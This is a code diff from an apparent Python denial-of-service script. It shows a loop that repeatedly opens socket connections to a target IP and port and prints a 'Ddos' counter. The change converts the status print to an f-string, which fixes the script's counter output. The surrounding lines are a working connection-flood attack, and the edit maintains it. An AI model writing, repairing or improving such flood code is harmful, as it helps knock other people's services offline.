@@ -44,7 +44,7 @@ while True:
 				while True:
 					i += 1
 					socket.socket().connect((ip, port))
-					print("Ddos: " + ip + "| Count: " + i)
+					print(f"Ddos: {ip} | Count: {i}")
 
 			if word == 'help':
 				print("""
